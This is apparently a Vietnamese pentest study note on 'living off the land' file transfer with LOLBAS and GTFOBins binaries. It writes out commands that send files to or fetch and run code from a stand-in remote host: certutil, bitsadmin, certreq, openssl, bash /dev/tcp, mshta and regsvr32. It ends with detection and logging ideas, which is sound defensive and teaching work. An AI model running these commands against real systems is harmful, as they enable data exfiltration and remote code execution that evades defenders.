---
layout: post
title: "Living off The Land"
render_with_liquid: false
categories:
  - File Transfer
tags:
  - file-transfer
  - living-off-the-land
  - lolbas
  - gtfobins
source_collection: manual
---
Topics: File Transfer, Living off the Land

## Overview

`Living off the land` là cách tận dụng các binary, script, library, hoặc utility hợp pháp có sẵn trên hệ thống để thực hiện hành động ngoài mục đích sử dụng thông thường của chúng. Cụm từ này được phổ biến bởi Christopher Campbell và Matt Graeber tại DerbyCon 3.

`LOLBins` là viết tắt của `Living off the Land binaries`. Đây là các binary hợp pháp mà attacker hoặc pentester có thể tận dụng để thực hiện các chức năng như:

- Download
- Upload
- Command execution
- File read
- File write
- Bypass

Hai nguồn tra cứu phổ biến:

- [LOLBAS](https://lolbas-project.github.io/) cho Windows
- [GTFOBins](https://gtfobins.github.io/) cho Linux/Unix

Trong file transfer, Living off the Land hữu ích khi target không có tool chuyên dụng như `curl`, `wget`, `scp`, hoặc khi muốn tận dụng binary đã được allowlist trong môi trường. Tuy nhiên, các kỹ thuật này cũng có giá trị detection cao, vì nhiều EDR/SIEM đã có rule cho các pattern phổ biến như `certutil` download, `bitsadmin` transfer, hoặc process hợp pháp kết nối ra internet bất thường.

## Quick Checklist

- Xác nhận binary có sẵn trên target.
- Kiểm tra chức năng cần dùng: download hay upload.
- Ưu tiên kênh được mã hóa như HTTPS, SSH, SFTP.
- Dùng file test hoặc dữ liệu giả nếu đang kiểm tra DLP/egress filtering.
- Verify hash sau khi transfer.
- Ghi lại command đã dùng để phục vụ report và cleanup.
- Với blue team, log đầy đủ process command line và network connection của LOLBins.

## Searching LOLBAS

LOLBAS có thể được dùng để tra các binary Windows theo chức năng. Khi cần tìm kỹ thuật download hoặc upload:

- Tìm `/download`
- Tìm `/upload`
- Kiểm tra binary path, command example, privileges, detection notes

Ví dụ binary Windows thường gặp trong file transfer:

- `certreq.exe`
- `certutil.exe`
- `bitsadmin.exe`
- `powershell.exe`
- `mshta.exe`
- `rundll32.exe`
- `regsvr32.exe`

Không phải binary nào cũng có ở mọi phiên bản Windows. Luôn kiểm tra `where <binary>` và help output trước khi dùng.

## LOLBAS Example: CertReq Upload

`certreq.exe` có thể gửi nội dung file bằng HTTP POST trong một số phiên bản.

Trên máy nhận, mở listener:

```bash
nc -lvnp 8000
```

Trên Windows target, gửi file:

```cmd
certreq.exe -Post -config http://<receiver-ip>:8000/ C:\Windows\win.ini
```

Listener sẽ nhận HTTP request có body là nội dung file. Ví dụ response phía receiver có thể gồm headers và nội dung:

```text
POST / HTTP/1.1
Content-Type: application/json
Host: <receiver-ip>:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Nếu gặp lỗi hoặc không có tham số `-Post`, phiên bản `certreq.exe` trên target có thể không hỗ trợ chức năng này. Không nên thay binary hệ thống trong môi trường khách hàng nếu chưa được phê duyệt.

## LOLBAS Example: Bitsadmin Download

`bitsadmin.exe` có thể tạo BITS job để download file:

```cmd
bitsadmin /transfer job1 /priority foreground http://<server-ip>:8000/file.bin C:\Windows\Temp\file.bin
```

BITS phù hợp khi HTTP/HTTPS outbound được phép. Tuy nhiên, `bitsadmin` là kỹ thuật cũ và thường bị giám sát.

## PowerShell BITS Transfer

PowerShell có module `BitsTransfer`:

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://<server-ip>:8000/file.bin" -Destination "C:\Windows\Temp\file.bin"
```

Một số ưu điểm của BITS:

- hỗ trợ transfer nền
- có thể resume
- hỗ trợ credential/proxy trong một số workflow quản trị

Nhược điểm:

- bị monitor phổ biến trong security tooling
- không phải môi trường nào cũng cho phép BITS ra ngoài internet

## LOLBAS Example: Certutil Download

`certutil.exe` có thể tải file qua URL:

```cmd
certutil.exe -urlcache -split -f http://<server-ip>:8000/file.bin C:\Windows\Temp\file.bin
```

Một biến thể khác:

```cmd
certutil.exe -verifyctl -split -f http://<server-ip>:8000/file.bin
```

Sau khi dùng URL cache, có thể xóa cache entry:

```cmd
certutil.exe -urlcache -f http://<server-ip>:8000/file.bin delete
```

Lưu ý: `certutil` download là pattern rất nổi tiếng và thường bị AMSI/EDR/SIEM phát hiện.

## Searching GTFOBins

GTFOBins dùng để tra binary Linux/Unix theo chức năng. Khi cần file transfer:

- Tìm `+file download`
- Tìm `+file upload`
- Đọc kỹ điều kiện: interactive shell, file permission, SUID, sudo, network access

Binary Linux thường gặp trong file transfer:

- `openssl`
- `bash`
- `curl`
- `wget`
- `scp`
- `ftp`
- `tar`
- `python`
- `php`
- `ruby`
- `perl`

## GTFOBins Example: OpenSSL Download

OpenSSL có thể truyền file kiểu Netcat nhưng qua TLS.

Tạo certificate trên máy gửi:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem -subj "/CN=transfer"
```

Máy gửi mở server và stream file:

```bash
openssl s_server -quiet -accept 8443 -cert certificate.pem -key key.pem < file.bin
```

Máy nhận download file:

```bash
openssl s_client -connect <sender-ip>:8443 -quiet > file.bin
```

Sau khi nhận, verify hash:

```bash
sha256sum file.bin
```

## GTFOBins Example: OpenSSL Upload

Đảo chiều kết nối để upload file từ target về receiver.

Receiver:

```bash
openssl s_server -quiet -accept 8443 -cert certificate.pem -key key.pem > loot.bin
```

Target gửi file:

```bash
openssl s_client -connect <receiver-ip>:8443 -quiet < loot.bin
```

Kỹ thuật này hữu ích khi `openssl` có sẵn nhưng `scp`, `sftp`, hoặc HTTPS upload endpoint không có.

## GTFOBins Example: Bash /dev/tcp

Nếu Bash hỗ trợ `/dev/tcp`, có thể nhận file từ TCP socket.

Máy gửi:

```bash
nc -l -p 9001 -q 0 < file.bin
```

Target nhận:

```bash
cat < /dev/tcp/<sender-ip>/9001 > file.bin
```

Hoặc upload từ target về receiver:

```bash
cat file.bin > /dev/tcp/<receiver-ip>/9001
```

Receiver:

```bash
nc -lvnp 9001 > file.bin
```

## Other Useful Windows LOLBins

### Mshta

`mshta.exe` có thể execute HTA/JScript/VBScript từ URL. Trong file transfer context, thường nên ưu tiên script rõ ràng như `cscript.exe` hoặc PowerShell nếu mục tiêu chỉ là download file, vì `mshta` có detection risk cao.

Ví dụ gọi HTA nội bộ trong lab:

```cmd
mshta.exe http://<server-ip>:8000/script.hta
```

### Cscript

Chạy JScript/VBScript downloader:

```cmd
cscript.exe /nologo wget.js http://<server-ip>:8000/file.bin C:\Windows\Temp\file.bin
```

### Regsvr32

`regsvr32.exe` từng được dùng để tải và execute scriptlet từ URL. Đây là pattern bị phát hiện mạnh và không nên dùng cho mục tiêu transfer file đơn thuần.

```cmd
regsvr32.exe /s /n /u /i:http://<server-ip>:8000/file.sct scrobj.dll
```

Ghi chú: ví dụ này thuộc nhóm command execution, không phải download file an toàn. Chỉ dùng trong lab/phân tích detection khi có scope rõ ràng.

## Defensive Detection Ideas

Các dấu hiệu nên giám sát:

- `certutil.exe` với URL hoặc tham số `-urlcache`, `-verifyctl`, `-split`, `-f`
- `bitsadmin.exe /transfer`
- `powershell.exe` gọi `Start-BitsTransfer`, `Invoke-WebRequest`, `DownloadString`, `DownloadFile`
- `certreq.exe -Post`
- `mshta.exe`, `regsvr32.exe`, `rundll32.exe` kết nối ra internet
- Linux process như `openssl s_client`, `openssl s_server`, `bash` dùng `/dev/tcp`
- parent process bất thường, ví dụ Office/browser/web server spawn LOLBin
- outbound network tới IP lạ, domain mới, port bất thường

Windows logging hữu ích:

- Sysmon Event ID 1: Process Create
- Sysmon Event ID 3: Network Connection
- PowerShell Script Block Logging
- Windows Security logs với command line process creation nếu bật

Linux logging hữu ích:

- shell history nếu còn
- auditd process execution
- EDR telemetry
- web proxy logs
- NetFlow/firewall logs

## Operational Notes

- Living off the Land không có nghĩa là stealth tuyệt đối. Nhiều LOLBins bị giám sát rất kỹ.
- Không thay thế binary hệ thống hoặc tải binary khác vào môi trường khách hàng nếu chưa được phép.
- Ưu tiên transfer dữ liệu giả hoặc file test khi chỉ kiểm tra egress.
- Với dữ liệu nhạy cảm, encrypt file trước khi dùng bất kỳ phương pháp transfer nào.
- Luôn verify hash sau khi download/upload.
- Cleanup file tạm, cache, job BITS, và listener sau khi hoàn tất.

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)
- [Ncat](https://nmap.org/ncat/)
